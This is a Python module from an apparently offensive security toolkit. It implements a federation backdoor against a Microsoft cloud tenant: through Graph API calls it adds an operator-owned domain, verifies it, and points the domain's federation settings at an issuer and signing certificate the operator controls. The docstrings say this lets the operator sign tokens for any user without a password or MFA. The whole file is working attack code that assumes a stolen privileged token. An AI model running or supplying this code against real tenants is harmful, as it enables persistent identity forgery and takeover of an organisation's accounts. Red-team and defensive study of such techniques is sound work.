# ============================================================================
"""The federation rung: make the tenant trust an IdP you control.

This is the rung above Golden SAML, and it is worse for the defender. Golden SAML forges a
token with the IdP's key; this makes the tenant accept YOUR key, so every token it accepts
afterwards is legitimately signed by you - for any user, with no password, no MFA and no
session to steal. The tenant's own logs show a normal federated sign-in.

The calls are ordinary and audited:

1. add the domain to the tenant (Graph)
2. prove control with a DNS TXT record (the operator's DNS)
3. set the domain's `federationConfiguration` to your issuer and signing certificate

Step 3 is the one that matters, and it needs `Domain.ReadWrite.All` (or Global Administrator /
Hybrid Identity Administrator). `core/tier0` reports whether the captured identity carries
those rights before any of this is attempted.

Nothing here is a bypass: each step is a real API call, the tenant can refuse any of them, and
the change is in the audit log. What it is, is the difference between "we have a mailbox" and
"we can mint identities".
"""
import json
import re
import time
from urllib.parse import quote

__all__ = ["FederationError", "plan", "add_domain", "verify_domain", "set_federation",
           "remove_federation", "GRAPH", "describe"]

GRAPH = "https://graph.microsoft.com/v1.0"


class FederationError(RuntimeError):
    """A refusal the CLI can report verbatim."""


def plan(domain, issuer="", cert_b64=""):
    """The three steps, with what each needs and what it looks like afterwards."""
    return {
        "domain": str(domain or ""),
        "issuer": issuer,
        "steps": [
            {"step": 1, "call": "POST /domains", "needs": "Domain.ReadWrite.All",
             "what": f"add {domain} to the tenant (it must not already be in another tenant)",
             "refused_when": "the domain is already verified in another tenant"},
            {"step": 2, "call": "DNS TXT", "needs": "control of the domain's DNS",
             "what": "publish the verification record the tenant asks for",
             "refused_when": "the record is wrong, or the operator does not own the domain"},
            {"step": 3, "call": "PATCH /domains/<id>", "needs": "Domain.ReadWrite.All",
             "what": "set federationConfiguration to the issuer and the signing certificate",
             "refused_when": "the tenant's policy forbids user-driven federation changes"},
        ],
        "after": ("every token the tenant accepts for this domain is signed by the issuer you "
                  "named; the tenant's logs show a federated sign-in, and the account's own "
                  "MFA is not consulted because the IdP is now the authority"),
        "visible": ("the tenant's audit log records the domain add, the verification and the "
                    "federation change - this is not stealthy, it is authoritative"),
        "created": time.time(),
    }


def add_domain(access_token, domain, post=None, timeout=15):
    """Add a domain to the tenant (step 1)."""
    if not access_token:
        raise FederationError("adding a domain needs an access token")
    if not str(domain or "").strip():
        raise FederationError("no domain to add")
    return _graph("POST", f"{GRAPH}/domains", access_token,
                  {"id": str(domain)}, post=post, timeout=timeout)


def verify_domain(access_token, domain, post=None, timeout=15):
    """Ask the tenant for the verification record (step 2, read half)."""
    return _graph("POST", f"{GRAPH}/domains/{domain_path(domain)}/verify", access_token, None,
                  post=post, timeout=timeout)


def set_federation(access_token, domain, issuer_uri, signing_cert_b64,
                   active_log_on_sign_out=False, pass_through=False, post=None,
                   timeout=15):
    """Point the domain at an issuer you control (step 3 - the rung that matters).

    `issuer_uri` is the SAML endpoint the tenant will POST to, and `signing_cert_b64` is the
    base64 of the DER certificate whose private key signs the assertions. Both are required: a
    federation without a signing certificate is a federation the tenant refuses.
    """
    if not access_token:
        raise FederationError("setting federation needs an access token")
    if not str(issuer_uri or "").strip():
        raise FederationError("no issuer URI: the tenant has nothing to redirect to")
    if not str(signing_cert_b64 or "").strip():
        raise FederationError("no signing certificate: the tenant would refuse the assertions")
    body = {"isVerified": True, "federationConfiguration": {
        "issuerUri": str(issuer_uri),
        "signingCertificate": str(signing_cert_b64),
        "activeLogOnUri": str(issuer_uri),
        "passiveLogOnUri": str(issuer_uri),
        "logOffUri": str(issuer_uri),
        "metadataExchangeUri": "",
        "preferredAuthenticationProtocol": "saml",
        "activeLogOnUriPresent": True,
        "federatedIdpMfaBehavior": "acceptIfMfaDoneByFederatedIdp",
        "promptLoginBehavior": "promptIfNotSpecified",
        "signOutUri": str(issuer_uri),
    }}
    return _graph("PATCH", f"{GRAPH}/domains/{domain_path(domain)}", access_token, body,
                  post=post, timeout=timeout)


def remove_federation(access_token, domain, post=None, timeout=15):
    """Undo it: clear the federation configuration (the engagement's clean-up path)."""
    return _graph("PATCH", f"{GRAPH}/domains/{domain_path(domain)}", access_token,
                  {"federationConfiguration": []}, post=post, timeout=timeout)


_DOMAIN_RE = re.compile(r"^[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?"
                        r"(\.[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?)+$")


def domain_path(domain):
    """A validated, percent-encoded domain for a Graph URL.

    `set_federation("AT", "../../applications/abc", ...)` interpolated straight into the path,
    so a value from a target could point the call at a DIFFERENT Graph endpoint. A domain name
    is a hostname: anything else is refused rather than encoded and hoped for.
    """
    text = str(domain or "").strip()
    if not _DOMAIN_RE.match(text):
        raise FederationError(f"not a domain name: {domain!r}")
    return quote(text, safe="")


def _graph(method, url, access_token, payload, post=None, timeout=15):
    if post is not None:
        # the refusal check runs whatever the transport: a Graph error inside an injected
        # answer must still come out as a FederationError, not as a silent success
        return _check(post(method, url, payload, timeout, access_token), url)
    import urllib.error
    import urllib.request

    from core import net
    body = json.dumps(payload).encode() if payload is not None else None
    req = urllib.request.Request(url, data=body, method=method, headers={
        "Content-Type": "application/json", "Accept": "application/json",
        "Authorization": f"Bearer {access_token}"})
    try:
        with net.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
    except (urllib.error.URLError, TimeoutError, OSError) as e:
        raise FederationError(f"{url} is unreachable ({type(e).__name__})") from e
    if not raw.strip():
        return {"ok": True, "status": "empty"}
    try:
        answer = json.loads(raw)
    except ValueError as e:
        raise FederationError(f"non-JSON answer from {url}: {raw[:200]}") from e
    return _check(answer, url)


def _check(answer, url):
    """A Graph error becomes a refusal the CLI can print, whatever carried it."""
    if isinstance(answer, dict) and answer.get("error"):
        err = answer["error"]
        msg = err.get("message") if isinstance(err, dict) else str(err)
        raise FederationError(f"the tenant refused: {msg}")
    return answer if isinstance(answer, dict) else {"raw": answer}


def describe(report):
    if isinstance(report, dict) and "steps" in report:
        lines = [f"federation plan for {report['domain']}:"]
        for step in report["steps"]:
            lines.append(f"  {step['step']}. {step['call']} - {step['what']}")
            lines.append(f"     needs: {step['needs']}"
                         + (f"  refused when: {step['refused_when']}"
                            if step.get("refused_when") else ""))
        lines.append(f"  after: {report['after']}")
        lines.append(f"  visible: {report['visible']}")
        return "\n".join(lines)
    return f"federation: {json.dumps(report, default=str)[:300]}"


